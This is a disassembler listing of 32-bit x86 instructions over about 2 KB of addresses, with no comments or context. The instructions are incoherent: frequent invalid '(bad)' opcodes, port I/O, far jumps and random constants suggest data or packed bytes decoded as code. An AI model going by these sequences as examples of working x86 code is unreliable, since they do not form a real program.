  40718d:	dec    ebx
  40718e:	dec    ecx
  40718f:	or     DWORD PTR [edi+0x13],eax
  407192:	fs cmp edi,ecx
  407195:	mov    ecx,0x76103116
  40719a:	dec    edi
  40719b:	imul   eax,DWORD PTR [edx-0x3df934df],0x22
  4071a2:	sbb    al,0x1b
  4071a4:	mov    dl,0xdf
  4071a6:	lea    ecx,[edi]
  4071a8:	or     ch,BYTE PTR [ecx-0x25592afa]
  4071ae:	mov    gs:0x95ac0317,al
  4071b4:	mov    eax,0xf8ab1b14
  4071b9:	push   eax
  4071ba:	je     0x4071b2
  4071bc:	mov    eax,ds:0x2847b5c2
  4071c1:	sbb    BYTE PTR [ebp+0x37],0x5c
  4071c5:	mov    bl,0x9f
  4071c7:	jmp    0x85e7:0x415b4163
  4071ce:	repz inc ebx
  4071d0:	add    eax,0xc196746d
  4071d5:	or     DWORD PTR [esi+ebx*2+0x1d3e2c00],0x6823193b
  4071e0:	je     0x407218
  4071e2:	test   BYTE PTR [edx-0x27],0x67
  4071e6:	lods   eax,DWORD PTR ds:[esi]
  4071e7:	cmp    BYTE PTR [ebx+eax*8-0x7b6c6085],cl
  4071ee:	das    
  4071ef:	sub    BYTE PTR [edx-0x30],dh
  4071f2:	push   ebp
  4071f3:	ret    
  4071f4:	or     DWORD PTR [ebp-0x5bf8dfdd],ebx
  4071fa:	or     esp,DWORD PTR [edx+eiz*1+0x42156d72]
  407201:	pop    ss
  407202:	mov    bl,0x26
  407204:	mov    WORD PTR [esi-0x7],?
  407207:	or     al,0x74
  407209:	adc    edx,DWORD PTR [edi+ebx*8+0x6e]
  40720d:	push   ecx
  40720e:	aas    
  40720f:	rcr    BYTE PTR [esi+ebx*8],cl
  407212:	pop    ds
  407213:	mov    ds:0x23c895e4,eax
  407218:	mov    eax,0x61a2cb00
  40721d:	push   0x6b7f2346
  407222:	dec    esi
  407223:	xor    BYTE PTR ds:0x3d744a0a,ch
  407229:	test   eax,0x9eb2539e
  40722e:	outs   dx,DWORD PTR ds:[esi]
  40722f:	sbb    eax,0x499610a7
  407234:	cdq    
  407235:	push   0x829d037d
  40723a:	jb     0x407282
  40723c:	in     eax,0x2f
  40723e:	push   esp
  40723f:	outs   dx,DWORD PTR ds:[esi]
  407240:	pop    esi
  407241:	in     eax,dx
  407242:	mov    cl,0x40
  407244:	fst    QWORD PTR [edi-0x2]
  407247:	(bad)  
  407248:	fmul   DWORD PTR [esi+eiz*2]
  40724b:	mov    ds:0x9938cc63,eax
  407250:	jmp    0xafd7:0xbce7d6f8
  407257:	jg     0x40720b
  407259:	(bad)
  40725d:	fsubrp st(7),st
  40725f:	int3   
  407260:	scas   eax,DWORD PTR es:[edi]
  407261:	test   DWORD PTR [edi-0x6a2752b],ebx
  407267:	jns    0x40723b
  407269:	xor    ah,dh
  40726b:	in     eax,0x77
  40726d:	hlt    
  40726e:	sub    al,BYTE PTR ds:0xe01d95de
  407274:	mov    ds:0x1a15ef8f,al
  407279:	mov    esp,0xb3b3ea0d
  40727e:	and    al,0xda
  407280:	mov    al,ds:0xb90b9db
  407285:	aam    0x58
  407287:	int    0x2e
  407289:	push   ebx
  40728a:	stos   DWORD PTR es:[edi],eax
  40728b:	adc    bl,ch
  40728d:	mov    cl,0x2
  40728f:	or     al,0xb
  407291:	add    ah,BYTE PTR [ecx]
  407293:	xor    eax,0x8f8d0dc6
  407298:	or     bh,bh
  40729a:	mov    esi,0x5dc6e5e6
  40729f:	xchg   BYTE PTR [ebx-0x5956596d],al
  4072a5:	lea    ecx,[edi-0x3f]
  4072a8:	push   ds
  4072a9:	jp     0x4072be
  4072ab:	sbb    BYTE PTR [ebp-0x33],dl
  4072ae:	aad    0x5a
  4072b0:	sbb    eax,0x9ede017c
  4072b5:	enter  0xf42e,0x20
  4072b9:	leave  
  4072ba:	xor    al,0x81
  4072bc:	dec    BYTE PTR [edx+0x71]
  4072bf:	fdiv   st(6),st
  4072c1:	fst    DWORD PTR [eiz*4-0xab5b7ab]
  4072c8:	lock ins DWORD PTR es:[edi],dx
  4072ca:	or     al,0xe3
  4072cc:	lods   al,BYTE PTR ds:[esi]
  4072cd:	jno    0x407284
  4072cf:	pushf  
  4072d0:	enter  0x4615,0xb1
  4072d4:	leave  
  4072d5:	xchg   BYTE PTR [esi+0x254da350],dh
  4072db:	mov    ebp,0xe9f34682
  4072e0:	jge    0x4072a0
  4072e2:	ins    DWORD PTR es:[edi],dx
  4072e3:	div    BYTE PTR [edi+0x7c]
  4072e6:	mov    cl,0xb2
  4072e8:	mov    esp,0x6d0b49f8
  4072ed:	and    edi,DWORD PTR [edx+0x76]
  4072f0:	fsubrp st(7),st
  4072f2:	jne    0x4072dd
  4072f4:	fcom   st(1)
  4072f6:	(bad)  
  4072f8:	(bad)  
  4072f9:	cli    
  4072fa:	and    edx,0x555c29a8
  407300:	lds    esp,FWORD PTR [edi]
  407302:	gs pop es
  407304:	mov    dl,0xd6
  407306:	or     bl,dh
  407308:	inc    esp
  407309:	add    BYTE PTR [ebx+0x69],0x77
  40730d:	pop    ebx
  40730e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40730f:	imul   ebp,DWORD PTR [eax-0x50],0x10
  407313:	mov    ds:0xf0f503b1,al
  407318:	ins    DWORD PTR es:[edi],dx
  407319:	(bad)  
  40731b:	and    bh,BYTE PTR [edi]
  40731d:	pop    DWORD PTR [ebp-0x46cf2375]
  407323:	test   eax,0x13feaf83
  407328:	dec    esp
  407329:	dec    edi
  40732a:	dec    ebx
  40732b:	push   es
  40732c:	test   al,0x45
  40732e:	fsubr  DWORD PTR [edx-0x51]
  407331:	adc    al,0x5e
  407333:	push   ebx
  407334:	pop    esi
  407335:	loopne 0x407343
  407337:	outs   dx,BYTE PTR ds:[esi]
  407338:	cdq    
  407339:	and    eax,0x5eda61c5
  40733e:	ins    BYTE PTR es:[edi],dx
  40733f:	retf   0xe986
  407342:	fs rcl cl,cl
  407345:	jno    0x4072de
  407347:	les    esi,FWORD PTR ds:[esi]
  40734a:	fs aas 
  40734c:	sahf   
  40734d:	ror    DWORD PTR [ecx-0x7ef829dc],cl
  407353:	bound  eax,QWORD PTR [edi]
  407355:	lds    ebp,FWORD PTR [edx]
  407357:	xor    eax,0x6a51ce55
  40735c:	mov    al,ds:0xefab1410
  407361:	int    0xaa
  407363:	int3   
  407364:	aaa    
  407365:	cld    
  407366:	hlt    
  407367:	adc    al,0xf3
  407369:	nop
  40736a:	mov    dl,0xb3
  40736c:	dec    ebp
  40736d:	test   eax,0xb2d0e73f
  407372:	fdivr  QWORD PTR [ebx]
  407374:	cmp    al,0x57
  407376:	es scas al,BYTE PTR es:[edi]
  407378:	push   eax
  407379:	dec    edx
  40737a:	out    0xf5,al
  40737c:	xchg   BYTE PTR [ecx+0x6e6312b7],bh
  407382:	adc    eax,0xda753e78
  407387:	popa   
  407388:	sbb    ah,BYTE PTR [eax]
  40738a:	xchg   edx,eax
  40738b:	mov    ah,0xd1
  40738d:	inc    ebx
  40738e:	sbb    BYTE PTR [esi],0xf6
  407391:	mov    ch,0x9e
  407393:	mov    cl,0x23
  407395:	popa   
  407396:	mov    ebx,0xb22e414c
  40739b:	xor    eax,0x7475ee04
  4073a0:	sub    al,0x30
  4073a2:	adc    BYTE PTR [edx],bh
  4073a4:	or     al,0x31
  4073a6:	mov    ds:0x561e4973,al
  4073ab:	mov    ebx,0x91f86591
  4073b0:	lods   al,BYTE PTR ds:[esi]
  4073b1:	jl     0x407354
  4073b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073b4:	pop    edx
  4073b5:	lds    ebx,FWORD PTR [ecx+0x2df6a44]
  4073bb:	cld    
  4073bc:	scas   eax,DWORD PTR es:[edi]
  4073bd:	cmp    BYTE PTR [eax-0x4e7d3f6b],al
  4073c3:	sahf   
  4073c4:	cs pop edx
  4073c6:	popa   
  4073c7:	cmp    BYTE PTR [edi+edi*2+0x51],al
  4073cb:	das    
  4073cc:	ins    DWORD PTR es:[edi],dx
  4073cd:	sub    ecx,ebx
  4073cf:	cmc    
  4073d0:	pop    ebp
  4073d1:	daa    
  4073d2:	sbb    edi,0xffffffa4
  4073d5:	jae    0x407369
  4073d7:	push   0xdf553631
  4073dc:	pop    ebx
  4073dd:	icebp  
  4073de:	mov    al,0x81
  4073e0:	ds pop eax
  4073e2:	ja     0x4073fa
  4073e4:	adc    eax,0x4a836d6
  4073e9:	cwde   
  4073ea:	ret    0x802d
  4073ed:	mov    gs,WORD PTR [ecx-0x35]
  4073f0:	and    BYTE PTR [edx],0xa0
  4073f3:	inc    ebp
  4073f4:	push   eax
  4073f5:	mov    bh,0xaf
  4073f7:	add    dh,BYTE PTR [edi-0x6e5d5b12]
  4073fd:	fwait
  4073fe:	add    DWORD PTR [esi],esi
  407400:	or     bh,dh
  407402:	push   ecx
  407403:	dec    DWORD PTR [edx]
  407405:	jbe    0x40746d
  407407:	shl    BYTE PTR [ecx+edi*8+0x2d],cl
  40740b:	(bad)  
  40740c:	sbb    eax,0x9abb1a5f
  407411:	retf   
  407412:	cmc    
  407413:	std    
  407414:	aas    
  407415:	ret    
  407416:	aad    0x8b
  407418:	out    dx,al
  407419:	add    eax,0x57dbeab0
  40741e:	test   BYTE PTR [edi+0x16],bh
  407421:	imul   edi,edx,0xffffff8c
  407424:	cdq    
  407425:	pop    es
  407426:	das    
  407427:	cwde   
  407428:	aam    0x35
  40742a:	add    eax,0x59462f2b
  40742f:	ja     0x407406
  407431:	mov    ch,BYTE PTR [eax]
  407433:	mov    WORD PTR [ebp-0x7e],gs
  407436:	pop    ds
  407437:	inc    eax
  407438:	idiv   BYTE PTR [edx+0x63]
  40743b:	add    al,0x35
  40743d:	push   esi
  40743e:	gs push edi
  407440:	psllq  mm7,mm7
  407443:	xor    eax,0xc846bee2
  407448:	push   esi
  407449:	aad    0x2e
  40744b:	std    
  40744c:	sub    eax,0xf580bf7f
  407451:	jae    0x40746d
  407453:	aad    0x2f
  407455:	xchg   esp,eax
  407456:	sub    ebx,eax
  407458:	inc    esi
  407459:	gs mov ecx,0x5979855d
  40745f:	rol    DWORD PTR [eax-0x44],1
  407462:	psubusw mm2,mm1
  407465:	push   ebx
  407466:	cmp    BYTE PTR [eax+0x47ae2240],bl
  40746c:	imul   esi,DWORD PTR [esi],0x29
  40746f:	xchg   edx,eax
  407470:	(bad)  
  407471:	push   0x31f75035
  407476:	or     DWORD PTR fs:[ecx+ecx*2],esi
  40747a:	xor    bh,ch
  40747c:	dec    edx
  40747d:	loop   0x40748c
  40747f:	xchg   ebp,eax
  407480:	lods   al,BYTE PTR ds:[esi]
  407481:	pop    esi
  407482:	shl    ebx,cl
  407484:	out    dx,al
  407485:	mov    ds:0x248781ae,eax
  40748a:	call   0xedf1add0
  40748f:	and    bl,cl
  407491:	leave  
  407492:	xchg   esp,eax
  407493:	pop    esp
  407494:	jo     0x407494
  407496:	push   edx
  407497:	or     cl,0x1f
  40749a:	mov    BYTE PTR [ebx],ah
  40749c:	ret    
  40749d:	jno    0x407465
  40749f:	jns    0x407518
  4074a1:	lahf   
  4074a2:	les    ebp,FWORD PTR [esp+edi*4+0x3d]
  4074a6:	mov    edi,0xbf012d7a
  4074ab:	inc    ebp
  4074ac:	mov    al,ds:0x25e03ddf
  4074b1:	cmp    ebx,DWORD PTR [edi-0x7a]
  4074b4:	dec    esp
  4074b5:	in     eax,0x52
  4074b7:	mov    al,0x2b
  4074b9:	rcl    BYTE PTR [ecx-0x64908829],cl
  4074bf:	jl     0x4074ee
  4074c1:	jns    0x407487
  4074c3:	outs   dx,BYTE PTR ds:[esi]
  4074c4:	sub    eax,0x29278ee7
  4074c9:	cmp    eax,0xd07fc318
  4074ce:	xor    DWORD PTR es:[ebp-0x53],0x55
  4074d3:	push   eax
  4074d4:	outs   dx,DWORD PTR ds:[esi]
  4074d5:	repnz fcom DWORD PTR [edx]
  4074d8:	or     eax,0x2635fbea
  4074dd:	test   eax,0x866f6981
  4074e2:	add    BYTE PTR [esi+0x4a],cl
  4074e5:	cli    
  4074e6:	cmc    
  4074e7:	popa   
  4074e8:	ror    DWORD PTR [ebx+ecx*8],1
  4074eb:	jmp    0x634e:0x6f6a70be
  4074f2:	mov    dl,BYTE PTR [ebp+0x51]
  4074f5:	add    edi,ecx
  4074f7:	out    dx,eax
  4074f8:	dec    ecx
  4074f9:	pop    es
  4074fa:	pop    edi
  4074fb:	in     al,0x4
  4074fd:	lea    esi,[eax+0x65279599]
  407503:	dec    edi
  407504:	mov    cl,0x5a
  407506:	xor    eax,0xa9bd5504
  40750b:	inc    ecx
  40750c:	or     ebx,edi
  40750e:	ret    0x155b
  407511:	pop    esi
  407512:	retf   
  407513:	fld    TBYTE PTR [esi]
  407515:	fwait
  407516:	sbb    edx,DWORD PTR [esi+esi*8]
  407519:	sbb    ecx,DWORD PTR [ecx+esi*8+0x72953218]
  407520:	cmc    
  407521:	jecxz  0x4074f7
  407523:	pop    ds
  407524:	les    eax,FWORD PTR [edx]
  407526:	sub    al,0x3d
  407528:	xchg   ebp,eax
  407529:	dec    esp
  40752a:	mov    ebx,0xd961082c
  40752f:	xchg   esi,eax
  407530:	loopne 0x40758b
  407532:	pusha  
  407533:	mov    ds:0x31aacc36,al
  407538:	icebp  
  407539:	cdq    
  40753a:	and    eax,0xb8efd780
  40753f:	xor    eax,0x4862230c
  407544:	scas   eax,DWORD PTR es:[edi]
  407545:	cdq    
  407546:	sub    BYTE PTR [ebx],dl
  407548:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407549:	jecxz  0x407570
  40754b:	fs out 0x92,al
  40754e:	lock mov cl,0x4e
  407551:	xlat   BYTE PTR ds:[ebx]
  407552:	mov    WORD PTR [edi],gs
  407554:	enter  0x98fe,0xfa
  407558:	jbe    0x4075aa
  40755a:	jnp    0x407599
  40755c:	push   eax
  40755d:	int    0xd4
  40755f:	(bad)  
  407560:	out    dx,al
  407561:	pop    esp
  407562:	mov    esp,0xb4195e16
  407567:	or     eax,0x38e860e5
  40756c:	dec    ecx
  40756d:	mov    ch,0x92
  40756f:	fadd   DWORD PTR [edx]
  407571:	je     0x4074f9
  407573:	retf   0xf1e7
  407576:	inc    edx
  407577:	push   edx
  407578:	cmp    al,0x4b
  40757a:	shl    esi,0xb4
  40757d:	or     al,0x11
  40757f:	xchg   DWORD PTR [ebx+0x67],ecx
  407582:	rol    BYTE PTR [edx],0xea
  407585:	push   esi
  407586:	bswap  esp
  407588:	repz in eax,dx
  40758a:	scas   al,BYTE PTR es:[edi]
  40758b:	add    al,0xb9
  40758d:	out    dx,eax
  40758e:	mov    ecx,0x936ed74a
  407593:	ja     0x407559
  407595:	mov    ch,0x74
  407597:	push   cs
  407598:	ret    0x8f37
  40759b:	into   
  40759c:	mov    ch,0x44
  40759e:	imul   ecx,esi,0x38
  4075a1:	pop    esi
  4075a2:	pop    ebp
  4075a3:	popa   
  4075a4:	in     al,dx
  4075a5:	adc    BYTE PTR gs:0xeb8eee33,0x76
  4075ad:	pusha  
  4075ae:	std    
  4075af:	pop    esp
  4075b0:	addr16 (bad) 
  4075b2:	inc    ebp
  4075b4:	adc    esp,DWORD PTR [esi+0x7ca2923]
  4075ba:	xchg   esp,eax
  4075bb:	mov    bh,0x53
  4075bd:	in     al,dx
  4075be:	rcl    DWORD PTR [ebx],1
  4075c0:	adc    BYTE PTR [ecx+0x58878841],al
  4075c6:	or     al,0xff
  4075c8:	dec    ebp
  4075c9:	dec    edx
  4075ca:	scas   al,BYTE PTR es:[edi]
  4075cb:	mov    esp,0xbe6196ef
  4075d0:	jb     0x40762c
  4075d2:	and    BYTE PTR [esi+0x29a709d6],0xf4
  4075d9:	mov    cl,0x76
  4075db:	xlat   BYTE PTR ds:[ebx]
  4075dc:	jae    0x407578
  4075de:	dec    esp
  4075df:	adc    al,0x9a
  4075e1:	inc    edi
  4075e2:	push   edx
  4075e3:	fs adc al,0xba
  4075e6:	mov    bh,0x30
  4075e8:	mov    bh,0x4b
  4075ea:	cli    
  4075eb:	cmc    
  4075ec:	jl     0x40762b
  4075ee:	loopne 0x407623
  4075f0:	lods   eax,DWORD PTR ds:[esi]
  4075f1:	adc    dh,BYTE PTR [esi]
  4075f3:	push   esp
  4075f4:	aas    
  4075f5:	loope  0x4075d0
  4075f7:	xor    eax,0x39af76f1
  4075fc:	ins    DWORD PTR es:[edi],dx
  4075fd:	icebp  
  4075fe:	cmp    DWORD PTR [ebp-0xf399cda],0x73
  407605:	push   cs
  407606:	pop    es
  407607:	xlat   BYTE PTR ds:[ebx]
  407608:	or     ah,BYTE PTR [edx]
  40760a:	adc    DWORD PTR [edx-0x53a3f412],esi
  407610:	cmp    esp,DWORD PTR [edi+0x74]
  407613:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407614:	out    0x6e,al
  407616:	adc    DWORD PTR [ebx-0x3fbed22],edx
  40761c:	daa    
  40761d:	fs stos BYTE PTR es:[edi],al
  40761f:	push   eax
  407620:	jecxz  0x40768a
  407622:	cmp    esi,DWORD PTR [di+0x1bae]
  407627:	(bad)  
  407628:	jg     0x4075b9
  40762a:	repnz pop esi
  40762c:	xchg   ecx,eax
  40762d:	fild   QWORD PTR [ebp+0xf]
  407630:	jmp    0x9a1a78c9
  407635:	mov    eax,ds:0xefc28b7b
  40763a:	pusha  
  40763b:	in     al,0xec
  40763d:	cdq    
  40763e:	adc    BYTE PTR [esi+0x56],0xdc
  407642:	mov    dl,0x68
  407644:	shl    BYTE PTR [eax+edx*1+0x4420fca7],0x49
  40764c:	fwait
  40764d:	push   ecx
  40764e:	sti    
  40764f:	fisttp DWORD PTR [esp+edi*2+0x42]
  407653:	inc    ebp
  407654:	leave  
  407655:	jmp    0x40768d
  407657:	sub    edi,edx
  407659:	sbb    al,0xfe
  40765b:	pop    ecx
  40765c:	xor    ah,bh
  40765e:	cmp    al,0xab
  407660:	push   ecx
  407661:	fxch   st(3)
  407663:	(bad)  
  407664:	cmp    ecx,edx
  407666:	stc    
  407667:	loopne 0x40768b
  407669:	repnz inc ebp
  40766b:	xchg   esi,eax
  40766c:	scas   al,BYTE PTR es:[edi]
  40766d:	mov    al,0xb7
  40766f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407670:	loopne 0x4075f5
  407672:	xchg   ecx,eax
  407673:	test   eax,0xf2b4de93
  407678:	mov    dl,BYTE PTR [ecx-0x11]
  40767b:	xchg   BYTE PTR gs:[esi+0x1a],cl
  40767f:	mov    bh,cl
  407681:	ins    BYTE PTR es:[edi],dx
  407682:	pop    esp
  407683:	mov    ebx,gs
  407685:	ret    0x649a
  407688:	xor    al,BYTE PTR [ecx-0x40347662]
  40768e:	cmp    esi,DWORD PTR [ebp+0x52]
  407691:	iret   
  407692:	pop    edi
  407693:	(bad)  
  407694:	xor    ebx,DWORD PTR [ebx+0x5]
  407697:	xor    cl,BYTE PTR [ecx+eax*1-0x3d]
  40769b:	call   0x95aac5a3
  4076a0:	mov    cl,0xc3
  4076a2:	xchg   esi,eax
  4076a3:	jne    0x4076f2
  4076a5:	sbb    eax,0x7a8fe317
  4076aa:	out    dx,eax
  4076ab:	fisttp QWORD PTR [ecx-0x46]
  4076ae:	jne    0x4076f3
  4076b0:	aaa    
  4076b1:	and    al,0x1a
  4076b3:	or     al,0x96
  4076b5:	fisubr DWORD PTR [ebp+0x16]
  4076b8:	push   edi
  4076b9:	cli    
  4076ba:	repz or eax,0x2f66002f
  4076c0:	inc    ebx
  4076c1:	sub    ch,bl
  4076c3:	pop    eax
  4076c4:	mov    ebp,0x6fb9f5
  4076c9:	mov    ebp,0xebfcfcd6
  4076ce:	(bad)  
  4076cf:	sar    DWORD PTR [edx+0x5b],cl
  4076d2:	mov    al,0x1b
  4076d4:	adc    ebx,edi
  4076d6:	push   0x73
  4076d8:	jns    0x4076eb
  4076da:	push   ebx
  4076db:	les    edi,FWORD PTR [eax+ebp*8+0x6e876b34]
  4076e2:	jnp    0x4076a6
  4076e4:	pop    ebx
  4076e5:	mov    ds:0x81f4ca2,eax
  4076ea:	mov    BYTE PTR [edx+0x4aa9be49],ah
  4076f0:	mov    bh,0x33
  4076f2:	add    eax,0xfe76030a
  4076f7:	mov    dh,bh
  4076f9:	mov    edx,0x8e4a8efa
  4076fe:	pop    es
  4076ff:	mov    ch,0x36
  407701:	push   ss
  407702:	nop
  407703:	push   0x6a866cac
  407708:	mov    dh,0xd6
  40770a:	xor    eax,0x7ac15287
  40770f:	adc    BYTE PTR [eax+eax*2],ch
  407712:	aam    0xc2
  407714:	scas   eax,DWORD PTR es:[edi]
  407715:	in     al,dx
  407716:	cs je  0x407728
  407719:	lds    esp,FWORD PTR ds:0xe642bfa9
  40771f:	and    al,0xb8
  407721:	dec    edx
  407722:	pop    ebp
  407723:	push   ecx
  407724:	sub    BYTE PTR [ebx-0x4e3625ac],bl
  40772a:	outs   dx,BYTE PTR ds:[esi]
  40772b:	std    
  40772c:	(bad)  
  40772d:	jne    0x4077aa
  40772f:	shr    BYTE PTR [edx],0x96
  407732:	sbb    eax,0x9bd55efa
  407737:	adc    BYTE PTR [eax+0x4a],0xf9
  40773b:	and    edx,DWORD PTR [ecx+eiz*1]
  40773e:	retf   0x779e
  407741:	in     al,0x9d
  407743:	sub    ecx,DWORD PTR [eax+0x3d]
  407746:	jns    0x4076ef
  407748:	inc    ebx
  407749:	imul   eax,DWORD PTR [edx-0x79],0x514096e3
  407750:	mov    ecx,ebx
  407752:	scas   eax,DWORD PTR es:[edi]
  407753:	push   0x8dcfe155
  407758:	jae    0x4076e2
  40775a:	aam    0x6a
  40775c:	(bad)  
  40775d:	jl     0x4077b5
  40775f:	mul    BYTE PTR [ebp+0x12a4ab9b]
  407765:	ins    BYTE PTR es:[edi],dx
  407766:	push   eax
  407767:	and    BYTE PTR [ebx+0xd651ced],bl
  40776d:	sbb    DWORD PTR [esi+0xd],ebp
  407770:	xor    eax,0x2a08c74
  407775:	inc    ebx
  407776:	call   0x743a:0xbeddafde
  40777d:	mov    ah,0x1d
  40777f:	cmc    
  407780:	in     al,dx
  407781:	jno    0x4077ce
  407783:	adc    BYTE PTR [ecx-0x1b76e31b],0x23
  40778a:	push   ecx
  40778b:	xor    eax,0xd1f691f6
  407790:	push   edi
  407791:	mov    al,0x11
  407793:	outs   dx,BYTE PTR ds:[esi]
  407794:	in     eax,0x3
  407796:	and    ebp,DWORD PTR [ecx-0x5c]
  407799:	test   al,0xbc
  40779b:	xor    BYTE PTR [eax+0x42],dl
  40779e:	inc    ecx
  40779f:	pop    ds
  4077a0:	cmp    al,0x33
  4077a2:	dec    eax
  4077a3:	inc    esi
  4077a4:	stos   BYTE PTR es:[edi],al
  4077a5:	or     bl,ch
  4077a7:	enter  0x88ed,0x19
  4077ab:	or     bh,dh
  4077ad:	iret   
  4077ae:	pop    ds
  4077af:	and    al,BYTE PTR [ecx+esi*4+0x3f99d669]
  4077b6:	pop    ds
  4077b7:	jnp    0x40779f
  4077b9:	retf   
  4077ba:	lahf   
  4077bb:	loop   0x4077d4
  4077bd:	sub    edi,DWORD PTR [edi-0x51c4c1db]
  4077c3:	(bad)  
  4077c4:	ja     0x4077c8
  4077c6:	dec    esi
  4077c7:	lods   eax,DWORD PTR ds:[esi]
  4077c8:	or     al,ah
  4077ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077cb:	fbstp  TBYTE PTR [eax-0x788fbf8e]
  4077d1:	mov    ah,0xb5
  4077d3:	xor    esi,DWORD PTR [ecx-0x49]
  4077d6:	pop    edi
  4077d7:	add    edx,DWORD PTR [edx-0x2e]
  4077da:	cmp    dl,BYTE PTR [ebx-0x76c52428]
  4077e0:	dec    esp
  4077e1:	mov    al,ds:0xdc58dd1a
  4077e6:	les    eax,FWORD PTR [esi]
  4077e8:	xchg   edi,eax
  4077e9:	or     BYTE PTR [ecx],0x4b
  4077ec:	add    eax,0x826615ed
  4077f1:	les    ebp,FWORD PTR [edx+0x6e]
  4077f4:	jp     0x4077ae
  4077f6:	icebp  
  4077f7:	mov    edi,0xfa1ba938
  4077fc:	xor    BYTE PTR [edi-0x65],al
  4077ff:	mov    al,ds:0xc0a56f67
  407804:	cwde   
  407805:	inc    edx
  407806:	fcom   st(3)
  407808:	bnd call 0xf5f1dabc
  40780e:	(bad)  
  40780f:	loopne 0x407874
  407811:	cmc    
  407812:	loop   0x40780c
  407814:	cmp    esi,0xc0b5a8cb
  40781a:	pop    edx
  40781b:	add    DWORD PTR [esi+0x7d3e2c8a],ecx
  407821:	cmc    
  407822:	out    dx,eax
  407823:	mov    ds:0xfeadb624,al
  407828:	pushf  
  407829:	pop    esp
  40782a:	mov    ds:0xdf4c7aed,eax
  40782f:	imul   ecx,DWORD PTR [ecx-0x23a3dc8],0x4b
  407836:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407837:	outs   dx,DWORD PTR ds:[esi]
  407838:	rcr    BYTE PTR [eax],0xba
  40783b:	mov    DWORD PTR ds:0x1c44a5ec,esi
  407841:	stos   BYTE PTR es:[edi],al
  407842:	sbb    BYTE PTR [eax+edx*1-0x7f],ah
  407846:	dec    eax
  407847:	mov    esp,DWORD PTR [esi+esi*8+0x6d]
  40784b:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40784d:	(bad)  
  40784f:	inc    esi
  407850:	lods   al,BYTE PTR ds:[esi]
  407851:	cmp    esi,edx
  407853:	push   ss
  407854:	or     BYTE PTR [ebp-0x48f7748d],ch
  40785a:	and    bl,BYTE PTR [ebp-0x194f00c8]
  407860:	add    BYTE PTR [edx+0x59],0x95
  407864:	rol    DWORD PTR [edi+eiz*4+0xa9a1497],0xca
  40786c:	xor    eax,0xf2ca56a7
  407871:	push   esi
  407872:	popf   
  407873:	hlt    
  407874:	stos   DWORD PTR es:[edi],eax
  407875:	je     0x407806
  407877:	stos   BYTE PTR es:[edi],al
  407878:	popa   
  407879:	sbb    BYTE PTR [ebp-0x3f],ch
  40787c:	data16 jmp 0x407874
  40787f:	xor    bl,0x10
  407882:	add    DWORD PTR [edx],edx
  407884:	mov    esp,ecx
  407886:	xchg   ecx,eax
  407887:	(bad)  
  407888:	mov    ebp,0xf0029929
  40788d:	test   ebx,edi
  40788f:	ss mov eax,0x8d2c4c2b
  407895:	mov    ds:0x56dfeecc,al
  40789a:	imul   ecx,eax,0xd
  40789d:	push   edx
  40789e:	pop    es
  40789f:	fs mov bl,bh
  4078a2:	sbb    eax,DWORD PTR [edx+0x43]
  4078a5:	mov    ecx,esp
  4078a7:	mov    eax,ds:0x67143847
  4078ac:	stos   DWORD PTR es:[edi],eax
  4078ad:	sbb    ah,BYTE PTR [ecx+ebx*4-0x248d4169]
  4078b4:	retf   
  4078b5:	or     eax,0xc6c21d50
  4078ba:	sbb    BYTE PTR [esp+ebx*1],0x32
  4078be:	xchg   ebx,eax
  4078bf:	xchg   edi,eax
  4078c0:	jp     0x40785c
  4078c2:	fsub   DWORD PTR [ebx+ecx*8]
  4078c5:	call   0xfbf0:0x694fdfed
  4078cc:	add    DWORD PTR [edi-0x74],edi
  4078cf:	xor    BYTE PTR [esi],al
  4078d1:	sar    BYTE PTR [edx-0x57],cl
  4078d4:	jnp    0x4078b7
  4078d6:	sahf   
  4078d7:	jbe    0x4078e6
  4078d9:	ret    0xe752
  4078dc:	sbb    BYTE PTR [ebp-0x492a56b6],ah
  4078e2:	or     ebp,DWORD PTR [ebp+0x2f]
  4078e5:	add    dh,BYTE PTR [eax+edi*1]
  4078e8:	shl    BYTE PTR ds:0x498cfa1a,cl
  4078ee:	bound  esp,QWORD PTR [eax+eax*2+0xc]
  4078f2:	(bad)  
  4078f3:	push   ebx
  4078f5:	jecxz  0x4078aa
  4078f7:	(bad)  
  4078f9:	adc    BYTE PTR [edi+0xd23d107],al
  4078ff:	or     al,0x5d
  407901:	inc    esi
  407902:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407903:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407904:	ins    DWORD PTR es:[edi],dx
  407905:	fs fwait
  407907:	fwait
  407908:	mov    al,ds:0xe8baf8ea
  40790d:	inc    edx
  40790e:	pop    esi
  40790f:	ds ss jmp ebp
  407913:	dec    edi
  407914:	and    al,0xfa
  407916:	and    eax,0x3480f05d
  40791b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40791c:	inc    ecx
  40791d:	jne    0x407937
  40791f:	cmp    edi,DWORD PTR [ebx]
  407921:	adc    al,0x2a
  407923:	pop    ss
  407924:	mov    edi,0x85551e81
  407929:	sub    al,ah
  40792b:	add    DWORD PTR [ecx+0x4b426da1],edi
  407931:	(bad)  [edi-0x69]
  407934:	xor    ah,0xfd
  407937:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407938:	sub    dh,BYTE PTR [esi+eax*4+0xf]
  40793c:	mov    cl,0x65
  40793e:	mov    es,esp
  407940:	sub    al,0xb8
  407942:	xor    DWORD PTR [ebp+0x20],ebx
  407945:	enter  0x36d3,0x88
  407949:	fiadd  WORD PTR [edi]
  40794b:	inc    ebp
  40794c:	in     eax,dx
  40794d:	jle    0x40790d
  40794f:	rol    BYTE PTR [ebx+0x44c1f231],1
  407955:	jnp    0x407951
  407957:	std    
  407958:	xor    bh,al
  40795a:	aas    
  40795b:	shl    BYTE PTR [edx],0xfc
  40795e:	ss out 0x9,al
  407961:	hlt    
  407962:	cmp    eax,0x95007bb8
  407967:	das    
  407968:	fmul   QWORD PTR [esi+esi*2]
  40796b:	jl     0x40799b
  40796d:	lods   al,BYTE PTR ds:[esi]
  40796e:	cmp    edx,DWORD PTR [esp+ebx*4+0x32]
